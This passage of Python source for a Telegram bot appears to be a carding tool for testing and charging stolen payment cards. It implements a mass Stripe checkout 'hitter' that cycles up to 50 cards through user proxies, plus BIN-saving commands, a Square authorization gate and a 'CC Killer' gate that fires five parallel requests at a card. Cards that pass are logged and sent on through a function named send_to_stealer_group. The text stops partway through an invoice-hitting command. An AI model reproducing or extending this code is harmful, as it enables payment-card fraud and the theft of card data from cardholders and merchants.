        elif status in ("3DS_REQUIRED", "3DS"):
            if idx >= 0:
                card_statuses[idx] = f"3DS Required {EMOJI['3ds']}"
            tds.append(raw_str)
        elif status == "DECLINED":
            if idx >= 0:
                card_statuses[idx] = f"Declined {EMOJI['declined']} — {resp[:50]}"
            declined.append((raw_str, resp))
        else:
            if idx >= 0:
                card_statuses[idx] = f"Error {EMOJI['error']} — {resp[:50]}"
            errors.append(raw_str)

        done_count += 1
        now = asyncio.get_event_loop().time()
        if done_count == 1 or done_count == total_count or done_count % 3 == 0 or (now - _last_edit[0] > 2):
            try:
                txt = await _build_hit_status_text(
                    merchant, price_str, success_url, display_cards, card_statuses,
                    done_count, email=user_email, trial_info=trial_info
                )
                await _safe_edit(loading_msg, txt, parse_mode=ParseMode.HTML)
                _last_edit[0] = now
            except Exception:
                pass

    summary = (
        f"\n─────────────────────\n"
        f"{EMOJI['charged']} Charged: {len(charged)}  "
        f"{EMOJI['live']} Live: {len(live)}  "
        f"{EMOJI['declined']} Declined: {len(declined)}  "
        f"{EMOJI['3ds']} 3DS: {len(tds)}  "
        f"{EMOJI['error']} Errors: {len(errors)}\n"
    )
    final_text = await _build_hit_status_text(
        merchant, price_str, success_url, display_cards, card_statuses,
        total_count, email=user_email, trial_info=trial_info
    )
    await _safe_edit(loading_msg, final_text + summary, parse_mode=ParseMode.HTML)


# ============================================================================
# SAVED BINS COMMANDS
# ============================================================================

@require_premium
async def savebin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Save a BIN prefix with a friendly name — /savebin name BIN[|mm|yy|cvv]"""
    user = update.effective_user
    message = update.message
    args = context.args or []
    if len(args) < 2:
        await message.reply_text(
            f"{PE_SAVE} <b>SAVE BIN</b>\n\n"
            f"{PE_CARD} <b>Usage:</b> <code>/savebin name BIN</code>\n\n"
            f"{PE_BOLT} <b>Examples:</b>\n"
            "<code>/savebin visa4532 453201</code>\n"
            "<code>/savebin mc5100 510051|xx|xx|xxx</code>\n\n"
            f"{PE_CARD} The name lets you pick this BIN quickly when hitting.",
            parse_mode=ParseMode.HTML
        )
        return
    name = args[0].lower()
    bin_value = args[1]
    if len(name) > 20:
        await message.reply_text(f"{PE_CROSS} Name too long (max 20 chars).", parse_mode=ParseMode.HTML)
        return
    parsed = parse_gen_input(bin_value)
    if not parsed:
        await message.reply_text(
            f"{PE_CROSS} <b>Invalid BIN.</b> Must be at least 6 digits.\n"
            f"{PE_BOLT} Example: <code>453201</code> or <code>453201|xx|26|xxx</code>",
            parse_mode=ParseMode.HTML
        )
        return
    save_user_bin(user.id, name, bin_value)
    await message.reply_text(
        f"{PE_CHECK} <b>BIN Saved!</b>\n\n"
        f"{PE_BOLT} <b>Name:</b> <code>{html.escape(name)}</code>\n"
        f"{PE_CARD} <b>BIN:</b> <code>{html.escape(bin_value)}</code>\n\n"
        f"{PE_SAVE} Use <code>/mybins</code> to view all saved BINs.",
        parse_mode=ParseMode.HTML
    )


@require_premium
async def mybins_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List saved BINs — /mybins"""
    user = update.effective_user
    message = update.message
    saved = get_user_saved_bins(user.id)
    if not saved:
        await message.reply_text(
            f"{PE_CARD} <b>No Saved BINs</b>\n\n"
            "You haven't saved any BINs yet.\n"
            f"{PE_SAVE} Use <code>/savebin name BIN</code> to save one.",
            parse_mode=ParseMode.HTML
        )
        return
    lines = [f"{PE_SAVE} <b>SAVED BINS ({len(saved)})</b>\n"]
    for b in saved:
        lines.append(f"{PE_CARD} <code>{html.escape(b['name'])}</code> ➜ <code>{html.escape(b['bin_value'])}</code>")
    lines.append(f"\n{PE_TRASH} Delete: <code>/deletebin name</code>")
    lines.append(f"{PE_BOLT} Use with: <code>/hit url</code>")
    await message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


@require_premium
async def deletebin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Delete a saved BIN — /deletebin name"""
    user = update.effective_user
    message = update.message
    args = context.args or []
    if not args:
        await message.reply_text(
            f"{PE_TRASH} <b>DELETE BIN</b>\n\n"
            f"{PE_CARD} <b>Usage:</b> <code>/deletebin name</code>\n\n"
            f"{PE_SAVE} Use <code>/mybins</code> to see your saved BINs.",
            parse_mode=ParseMode.HTML
        )
        return
    name = args[0].lower()
    deleted = delete_user_bin(user.id, name)
    if deleted:
        await message.reply_text(
            f"{PE_TRASH} <b>Deleted:</b> <code>{html.escape(name)}</code>",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.reply_text(
            f"{PE_CROSS} <b>BIN not found:</b> <code>{html.escape(name)}</code>\n\n"
            f"{PE_SAVE} Use <code>/mybins</code> to view your saved BINs.",
            parse_mode=ParseMode.HTML
        )


# AUTO HITTER ADDITIONAL COMMANDS
# ============================================================================

@require_premium
async def coinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get checkout info without charging - /coinfo [url]"""
    user = update.effective_user
    message = update.message
    
    if not context.args:
        await message.reply_text(
            "<b>🎯 Checkout Info</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/coinfo [stripe_checkout_url]</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/coinfo https://checkout.stripe.com/c/pay/cs_...</code>\n\n"
            "Get merchant, amount, and checkout details without charging.",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = context.args[0].strip()
    
    if "stripe" not in url.lower() and "checkout" not in url.lower():
        await message.reply_text(ae("❌ <b>Invalid URL</b>\n\nPlease provide a valid Stripe checkout URL."), parse_mode=ParseMode.HTML)
        return
    
    status_msg = await message.reply_text(ae("🔍 <b>Fetching checkout info...</b>"), parse_mode=ParseMode.HTML)
    
    try:
        info = await tls_get_checkout_info(url)
        text = format_checkout_info(info)
        
        if info.get("pk") and info.get("cs"):
            text += f"\n\n💡 <b>To charge:</b>\n<code>/co {url} [card|mm|yy|cvv]</code>"
        else:
            text += "\n\n⚠️ Could not extract session details"
            
        await status_msg.edit_text(text, parse_mode=ParseMode.HTML)
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ <b>Error:</b> {str(e)[:100]}"), parse_mode=ParseMode.HTML)

@require_premium
async def cocheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if checkout is still active - /cocheck [url]"""
    user = update.effective_user
    message = update.message
    
    if not context.args:
        await message.reply_text(
            "<b>🔍 Checkout Status Check</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/cocheck [stripe_checkout_url]</code>\n\n"
            "Check if a Stripe checkout URL is still active and chargeable.",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = context.args[0].strip()
    
    status_msg = await message.reply_text(ae("🔍 <b>Checking checkout status...</b>"), parse_mode=ParseMode.HTML)
    
    try:
        info = await tls_get_checkout_info(url)
        
        if info.get("pk") and info.get("cs"):
            is_active = await ah_check_checkout_active(info["pk"], info["cs"])
            
            if is_active:
                merchant = info.get('merchant', 'Unknown')
                price = info.get('price', 'N/A')
                currency = info.get('currency', 'USD')
                
                await status_msg.edit_text(
                    f"✅ <b>CHECKOUT ACTIVE</b>\n\n"
                    f"🏢 <b>Merchant:</b> {merchant}\n"
                    f"💰 <b>Amount:</b> {price} {currency}\n"
                    f"📦 <b>Product:</b> {info.get('product', 'N/A')}\n\n"
                    f"💡 Ready to charge with <code>/co</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await status_msg.edit_text(
                    "❌ <b>CHECKOUT EXPIRED</b>\n\n"
                    "This checkout session has expired or been completed.",
                    parse_mode=ParseMode.HTML
                )
        else:
            await status_msg.edit_text(
                "❌ <b>INVALID CHECKOUT</b>\n\n"
                "Could not extract checkout details from this URL.",
                parse_mode=ParseMode.HTML
            )
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ <b>Error:</b> {str(e)[:100]}"), parse_mode=ParseMode.HTML)

@require_premium
async def mco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass checkout hitter - /mco [url] + cards"""
    user = update.effective_user
    message = update.message
    
    full_text = message.text or ""
    if message.reply_to_message and message.reply_to_message.text:
        full_text = full_text + "\n" + message.reply_to_message.text
    
    url = extract_checkout_url(full_text)
    
    if not url:
        await message.reply_text(
            "<b>⚡ Mass Auto Hitter</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/mco [url]</code> + reply to cards\n"
            "▸ <code>/mco [url] [cards...]</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/mco https://checkout.stripe.com/pay/cs_...</code>\n"
            "<code>4111111111111111|12|25|123</code>\n"
            "<code>5500000000000004|06|26|456</code>\n\n"
            "Max 50 cards per batch.",
            parse_mode=ParseMode.HTML
        )
        return
    
    text_without_url = full_text.replace(url, ' ')
    cards = auto_hitter_parse_cards(text_without_url)
    
    if not cards:
        for part in re.split(r'[\s\n]+', text_without_url):
            if '|' in part and len(part) > 10:
                card = auto_hitter_parse_card(part.strip())
                if card and card not in cards:
                    cards.append(card)
    
    if not cards:
        await message.reply_text(ae("❌ <b>No cards found!</b>\n\nProvide cards in format: <code>cc|mm|yy|cvv</code>"), parse_mode=ParseMode.HTML)
        return
    
    if len(cards) > 50:
        cards = cards[:50]
    
    status_msg = await message.reply_text(ae(f"🔍 <b>Extracting checkout...</b>\n\nCards: {len(cards)}"), parse_mode=ParseMode.HTML)
    
    try:
        info = await tls_get_checkout_info(url)
        
        if not info.get("pk") or not info.get("cs"):
            await status_msg.edit_text(ae("❌ <b>Could not extract checkout session!</b>"), parse_mode=ParseMode.HTML)
            return
        
        merchant = info.get('merchant', 'Unknown')
        amount = f"{info.get('price', '0')} {info.get('currency', 'USD')}"
        
        results = {"charged": [], "declined": [], "live": [], "error": []}
        
        await status_msg.edit_text(
            f"⚡ <b>Mass Hitting...</b>\n\n"
            f"🏢 Merchant: {merchant}\n"
            f"💰 Amount: {amount}\n"
            f"💳 Cards: {len(cards)}\n\n"
            f"Progress: 0/{len(cards)}",
            parse_mode=ParseMode.HTML
        )
        
        for i, card in enumerate(cards, 1):
            user_proxy = ah_get_user_proxy(user.id)
            user_email = ah_get_user_email(user.id)
            result = await try_all_approaches(info["pk"], info["cs"], card, user_proxy, user_email)
            card_str = f"{card['cc'][:6]}****{card['cc'][-4:]}|{card['month']}|{card['year']}"
            
            status = result.get("status", "ERROR")
            if status == "CHARGED":
                results["charged"].append(card_str)
            elif status == "3DS_REQUIRED":
                results["live"].append(card_str)
            elif status == "DECLINED":
                results["declined"].append(card_str)
            else:
                results["error"].append(card_str)
            
            if i % 5 == 0 or i == len(cards):
                try:
                    await status_msg.edit_text(
                        f"⚡ <b>Mass Hitting...</b>\n\n"
                        f"🏢 Merchant: {merchant}\n"
                        f"💰 Amount: {amount}\n\n"
                        f"Progress: {i}/{len(cards)}\n"
                        f"✅ Charged: {len(results['charged'])}\n"
                        f"🔵 Live (3DS): {len(results['live'])}\n"
                        f"❌ Declined: {len(results['declined'])}",
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
        
        summary = f"<b>⚡ MASS HIT COMPLETE</b>\n\n"
        summary += f"🏢 <b>Merchant:</b> {merchant}\n"
        summary += f"💰 <b>Amount:</b> {amount}\n\n"
        summary += f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        summary += f"📊 <b>Results:</b>\n"
        summary += f"✅ Charged: {len(results['charged'])}\n"
        summary += f"🔵 Live (3DS): {len(results['live'])}\n"
        summary += f"❌ Declined: {len(results['declined'])}\n"
        summary += f"⚠️ Errors: {len(results['error'])}\n\n"
        
        if results["charged"]:
            summary += f"<b>✅ CHARGED:</b>\n"
            for c in results["charged"][:10]:
                summary += f"<code>{c}</code>\n"
            if len(results["charged"]) > 10:
                summary += f"<i>...and {len(results['charged']) - 10} more</i>\n"
        
        if results["live"]:
            summary += f"\n<b>🔵 LIVE (3DS):</b>\n"
            for c in results["live"][:10]:
                summary += f"<code>{c}</code>\n"
            if len(results["live"]) > 10:
                summary += f"<i>...and {len(results['live']) - 10} more</i>\n"
        
        await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ <b>Error:</b> {str(e)[:100]}"), parse_mode=ParseMode.HTML)

# ============================================================================
# PROXY MANAGEMENT COMMANDS
# ============================================================================

@require_approval
async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add proxy for user - /addproxy [proxy]"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nProxy management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
    user_proxies = ah_get_user_proxies(user_id)
    
    if not context.args:
        if user_proxies:
            proxy_list = "\n".join([f"    • <code>{p}</code>" for p in user_proxies[:10]])
            if len(user_proxies) > 10:
                proxy_list += f"\n    • <code>... and {len(user_proxies) - 10} more</code>"
        else:
            proxy_list = "    • <code>None</code>"
        
        await message.reply_text(
            "<b>🔒 Proxy Manager</b>\n\n"
            f"<b>Your Proxies ({len(user_proxies)}):</b>\n{proxy_list}\n\n"
            "<b>Commands:</b>\n"
            "▸ <code>/addproxy proxy</code> — Add proxy\n"
            "▸ <code>/removeproxy proxy</code> — Remove proxy\n"
            "▸ <code>/removeproxy all</code> — Remove all\n"
            "▸ <code>/myproxy</code> — View your proxies\n"
            "▸ <code>/checkproxy</code> — Check all proxies\n\n"
            "<b>Formats:</b>\n"
            "• <code>host:port:user:pass</code>\n"
            "• <code>user:pass@host:port</code>\n"
            "• <code>host:port</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy_input = " ".join(context.args).strip()
    proxies_to_add = [p.strip() for p in proxy_input.split('\n') if p.strip()]
    
    if not proxies_to_add:
        await message.reply_text(ae("❌ <b>Error:</b> No valid proxies provided"), parse_mode=ParseMode.HTML)
        return
    
    checking_msg = await message.reply_text(
        f"⏳ <b>Checking Proxies...</b>\n\n"
        f"Total: {len(proxies_to_add)}\n"
        f"Threads: 10",
        parse_mode=ParseMode.HTML
    )
    
    results = await ah_check_proxies_batch(proxies_to_add, max_threads=10)
    
    alive_proxies = []
    dead_proxies = []
    
    for r in results:
        if r["status"] == "alive":
            alive_proxies.append(r)
            ah_add_user_proxy(user_id, r["proxy"])
        else:
            dead_proxies.append(r)
    
    response = f"<b>✅ Proxy Check Complete</b>\n\n"
    response += f"Alive: {len(alive_proxies)}/{len(proxies_to_add)} ✅\n"
    response += f"Dead: {len(dead_proxies)}/{len(proxies_to_add)} ❌\n\n"
    
    if alive_proxies:
        response += "<b>Added:</b>\n"
        for p in alive_proxies[:5]:
            response += f"• <code>{p['proxy']}</code> ({p['response_time']})\n"
        if len(alive_proxies) > 5:
            response += f"• <code>... and {len(alive_proxies) - 5} more</code>\n"
    
    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

@require_approval
async def removeproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove proxy - /removeproxy [proxy|all]"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nProxy management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
    
    if not context.args:
        await message.reply_text(
            "<b>🗑️ Remove Proxy</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/removeproxy proxy</code> — Remove specific\n"
            "▸ <code>/removeproxy all</code> — Remove all",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy_input = " ".join(context.args).strip()
    
    if proxy_input.lower() == "all":
        user_proxies = ah_get_user_proxies(user_id)
        count = len(user_proxies)
        ah_remove_user_proxy(user_id, "all")
        await message.reply_text(
            f"<b>✅ All Proxies Removed</b>\n\n"
            f"Removed: {count} proxies",
            parse_mode=ParseMode.HTML
        )
        return
    
    if ah_remove_user_proxy(user_id, proxy_input):
        await message.reply_text(
            f"<b>✅ Proxy Removed</b>\n\n"
            f"Proxy: <code>{proxy_input}</code>",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.reply_text(
            f"<b>❌ Error</b>\n\n"
            f"Proxy not found",
            parse_mode=ParseMode.HTML
        )

@require_approval
async def myproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View your proxies - /myproxy"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nProxy management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
    user_proxies = ah_get_user_proxies(user_id)
    
    if user_proxies:
        proxy_list = "\n".join([f"• <code>{p}</code>" for p in user_proxies[:15]])
        if len(user_proxies) > 15:
            proxy_list += f"\n• <code>... and {len(user_proxies) - 15} more</code>"
    else:
        proxy_list = "• <code>None set</code>"
    
    await message.reply_text(
        f"<b>🔒 Your Proxies ({len(user_proxies)})</b>\n\n"
        f"{proxy_list}\n\n"
        f"<b>Commands:</b>\n"
        f"▸ <code>/addproxy</code> — Add proxy\n"
        f"▸ <code>/checkproxy</code> — Check all",
        parse_mode=ParseMode.HTML
    )

@require_approval
async def checkproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check all your proxies - /checkproxy"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nProxy management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
    user_proxies = ah_get_user_proxies(user_id)
    
    if not user_proxies:
        await message.reply_text(
            "<b>❌ No Proxies</b>\n\n"
            "You have no proxies set.\n"
            "Use <code>/addproxy</code> to add one.",
            parse_mode=ParseMode.HTML
        )
        return
    
    checking_msg = await message.reply_text(
        f"<b>⏳ Checking Proxies...</b>\n\n"
        f"Total: {len(user_proxies)}\n"
        f"Threads: 10",
        parse_mode=ParseMode.HTML
    )
    
    results = await ah_check_proxies_batch(user_proxies, max_threads=10)
    
    alive = [r for r in results if r["status"] == "alive"]
    dead = [r for r in results if r["status"] == "dead"]
    
    response = f"<b>📊 Proxy Check Results</b>\n\n"
    response += f"Alive: {len(alive)}/{len(user_proxies)} ✅\n"
    response += f"Dead: {len(dead)}/{len(user_proxies)} ❌\n\n"
    
    if alive:
        response += "<b>Alive Proxies:</b>\n"
        for p in alive[:5]:
            ip_display = p.get('external_ip', 'N/A')
            response += f"• <code>{p['proxy']}</code>\n  IP: {ip_display} | {p['response_time']}\n"
        if len(alive) > 5:
            response += f"• <code>... and {len(alive) - 5} more</code>\n"
        response += "\n"
    
    if dead:
        response += "<b>Dead Proxies:</b>\n"
        for p in dead[:3]:
            error = p.get('error', 'Unknown')
            response += f"• <code>{p['proxy']}</code> ({error})\n"
        if len(dead) > 3:
            response += f"• <code>... and {len(dead) - 3} more</code>\n"
    
    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

# ============================================================================
# EMAIL MANAGEMENT COMMANDS
# ============================================================================

@require_approval
async def setemail_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set custom email for payments - /setemail [email]"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nEmail management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
    current_email = ah_get_user_email(user_id)
    
    if not context.args:
        if current_email:
            await message.reply_text(
                f"<b>📧 Your Email</b>\n\n"
                f"Current: <code>{current_email}</code>\n\n"
                f"<b>Commands:</b>\n"
                f"▸ <code>/setemail new@email.com</code> — Set email\n"
                f"▸ <code>/setemail remove</code> — Remove email",
                parse_mode=ParseMode.HTML
            )
        else:
            await message.reply_text(
                f"<b>📧 Set Email</b>\n\n"
                f"Set a custom email for payment checkouts.\n\n"
                f"<b>Usage:</b>\n"
                f"▸ <code>/setemail email@example.com</code>",
                parse_mode=ParseMode.HTML
            )
        return
    
    email_input = context.args[0].strip()
    
    if email_input.lower() == "remove":
        if ah_remove_user_email(user_id):
            await message.reply_text(ae("<b>✅ Email Removed</b>"), parse_mode=ParseMode.HTML)
        else:
            await message.reply_text(ae("<b>❌ No email was set</b>"), parse_mode=ParseMode.HTML)
        return
    
    if '@' not in email_input or '.' not in email_input:
        await message.reply_text(ae("<b>❌ Invalid email format</b>"), parse_mode=ParseMode.HTML)
        return
    
    ah_set_user_email(user_id, email_input)
    await message.reply_text(
        f"<b>✅ Email Set</b>\n\n"
        f"Email: <code>{email_input}</code>\n\n"
        f"This email will be used for all /co payments.",
        parse_mode=ParseMode.HTML
    )

@require_approval
async def myemail_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View your email - /myemail"""
    user = update.effective_user
    message = update.message
    
    if not is_premium(user.id):
        await message.reply_text(ae("🔒 <b>Premium Feature</b>\n\nEmail management is available for premium members only."), parse_mode=ParseMode.HTML)
        return
    
    user_id = user.id
    current_email = ah_get_user_email(user_id)
    
    if current_email:
        await message.reply_text(
            f"<b>📧 Your Email</b>\n\n"
            f"Email: <code>{current_email}</code>\n\n"
            f"▸ <code>/setemail new@email.com</code> — Change\n"
            f"▸ <code>/setemail remove</code> — Remove",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.reply_text(
            f"<b>📧 No Email Set</b>\n\n"
            f"Use <code>/setemail email@example.com</code> to set one.",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# STRIPE INVOICE HITTER - BarryX API
# ============================================================================

from modules.cc_killer import check as cc_kill_logic

from modules.square_auth import square_auth_logic

# SQUARE AUTH GATE - /sq
# ============================================================================

@require_premium
async def gate_sq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Square Auth Gate - /sq [cc|mm|yy|cvv]"""
    user = update.effective_user
    message = update.message
    
    if not context.args:
        await message.reply_text(
            "⬛ <b>SQUARE AUTH GATE</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/sq [cc|mm|yy|cvv]</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/sq 4242424242424242|12|25|123</code>",
            parse_mode=ParseMode.HTML
        )
        return

    full_text = " ".join(context.args)
    card_pattern = r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b'
    card_match = re.search(card_pattern, full_text)
    
    if not card_match:
        await message.reply_text(ae("❌ <b>Invalid Card Format!</b>\nUse: <code>CC|MM|YY|CVV</code>"), parse_mode=ParseMode.HTML)
        return
        
    cc, mm, yy, cvv = card_match.groups()
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    username = user.username or user.first_name
    
    loading_msg = await message.reply_text(
        f"⬛ <b>SQUARE AUTH GATE</b>\n\n"
        f"<code>{cc[:6]}******{cc[-4:]}</code>\n"
        f"⏳ Authorizing...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        start_time = time.time()
        result = await square_auth_logic(card_str)
        elapsed = time.time() - start_time
        from modules.gate_checker import get_bin_info
        bin_info = get_bin_info(cc)
        
        is_success = "Approved" in result or "CVV MATCHED" in result or "CNN MATCHED" in result
        
        bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
        if bin_info.get('type'):
            bin_type += f" - {bin_info.get('type', '').upper()}"
            
        status_icon = "✅ AUTHORIZED" if is_success else "❌ DECLINED"
        
        response = (
            f"Card: <code>{card_str}</code>\n"
            f"Status: {status_icon}\n"
            f"Response: {result}\n"
            f"Gateway: Square Auth\n\n"
            f"Brand: {bin_type}\n"
            f"Bank: {bin_info.get('bank', 'Unknown')}\n"
            f"Country: {bin_info.get('country', 'Unknown').upper()}\n\n"
            f"Time: {elapsed:.2f}s\n"
            f"Checked By: {username}"
        )
        
        if is_success:
            log_approved_card(user.id, username, cc, mm, yy, cvv, "sq", result, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "sq", result, bin_info, user.id, username)
            try:
                success_gif = get_sexy_anime_gif("success")
                await message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                await loading_msg.delete()
            except:
                await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
        else:
            await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
            
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"), parse_mode=ParseMode.HTML)

# CC KILLER GATE - /kill
# ============================================================================

@require_premium
async def gate_kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """CC Killer Gate - /kill [cc|mm|yy|cvv]"""
    user = update.effective_user
    message = update.message
    
    if not context.args:
        await message.reply_text(
            "💀 <b>CC KILLER GATE</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/kill [cc|mm|yy|cvv]</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/kill 4242424242424242|12|25|123</code>",
            parse_mode=ParseMode.HTML
        )
        return

    full_text = " ".join(context.args)
    card_pattern = r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b'
    card_match = re.search(card_pattern, full_text)
    
    if not card_match:
        await message.reply_text(ae("❌ <b>Invalid Card Format!</b>\nUse: <code>CC|MM|YY|CVV</code>"), parse_mode=ParseMode.HTML)
        return
        
    cc, mm, yy, cvv = card_match.groups()
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    username = user.username or user.first_name
    
    loading_msg = await message.reply_text(
        f"💀 <b>CC KILLER GATE</b>\n\n"
        f"<code>{cc[:6]}******{cc[-4:]}</code>\n"
        f"⏳ Killing the card...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        start_time = time.time()
        from modules.cc_killer import proxy_list
        proxy = random.choice(proxy_list)
        
        # We'll run 5 simultaneous checks for maximum efficiency as per the source logic
        tasks = [cc_kill_logic(card_str, proxy, i+1) for i in range(5)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        elapsed = time.time() - start_time
        from modules.gate_checker import get_bin_info
        bin_info = get_bin_info(cc)
        
        # Analyze results to find a successful one or use the first response
        status_found = False
        final_status = "Unknown response"
        
        for res in results:
            if isinstance(res, str) and "Approved" in res:
                final_status = res.split(": ", 1)[1]
                status_found = True
                break
        
        if not status_found:
            # If no success, just take the first result that isn't an error
            for res in results:
                if isinstance(res, str) and "Error" not in res:
                    final_status = res.split(": ", 1)[1]
                    break
        
        is_success = "Approved" in final_status
        
        bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
        if bin_info.get('type'):
            bin_type += f" - {bin_info.get('type', '').upper()}"
        
        # Custom response messages for CC Killer
        random_count = random.randint(1, 25)
        
        if is_success:
            stat_text = "Card is still live try again 😭"
        else:
            stat_text = f"Processed ({random_count}) ✅🔥"
        
        # Get country flag emoji
        country_code = bin_info.get('country_code', bin_info.get('country', 'XX'))[:2].upper()
        country_flags = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'UK': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪', 'FR': '🇫🇷',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'RU': '🇷🇺',
            'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱', 'BE': '🇧🇪', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'PL': '🇵🇱', 'TR': '🇹🇷', 'SA': '🇸🇦', 'AE': '🇦🇪', 'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭',
            'PH': '🇵🇭', 'ID': '🇮🇩', 'VN': '🇻🇳', 'ZA': '🇿🇦', 'NG': '🇳🇬', 'EG': '🇪🇬', 'AR': '🇦🇷',
            'CL': '🇨🇱', 'CO': '🇨🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'NZ': '🇳🇿', 'IE': '🇮🇪', 'PT': '🇵🇹',
            'CH': '🇨🇭', 'AT': '🇦🇹', 'GR': '🇬🇷', 'CZ': '🇨🇿', 'HU': '🇭🇺', 'RO': '🇷🇴', 'UA': '🇺🇦',
        }
        flag = country_flags.get(country_code, '🌍')
        
        response = (
            f"𝐂𝐚𝐫𝐝: <code>{card_str}</code>\n"
            f"Status : {stat_text}\n"
            f"Gate : Killer\n\n"
            f"𝐈𝐧𝐟𝐨: {bin_type}\n"
            f"𝐁𝐚𝐧𝐤: {bin_info.get('bank', 'N/A')}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {flag} {country_code}\n\n"
            f"𝐓𝐢𝐦𝐞: {elapsed:.2f} 𝐒𝐞𝐜. | 𝐏𝐫𝐨𝐱𝐲: Live ✅"
        )
        
        if is_success:
            log_approved_card(user.id, username, cc, mm, yy, cvv, "kill", final_status, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "kill", final_status, bin_info, user.id, username)
            try:
                success_gif = get_sexy_anime_gif("success")
                await message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                await loading_msg.delete()
            except:
                await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
        else:
            await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
            
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"), parse_mode=ParseMode.HTML)

# STRIPE INVOICE HITTER - BarryX API
# ============================================================================

@require_premium
async def stripe_invoice_hitter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe Invoice Hitter using BarryX API - /inv [invoice_url] [cc|mm|yy|cvv] - supports up to 10 cards"""
    import aiohttp
    import time as time_module
    import re
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    message = update.message
    
    if not context.args:
        await message.reply_text(
            "🧾 <b>STRIPE INVOICE HITTER</b>\n\n"
            "<b>Usage:</b>\n"
            "▸ <code>/inv [invoice_url] [cc|mm|yy|cvv]</code>\n\n"
            "<b>Mass Check (up to 10 cards):</b>\n"
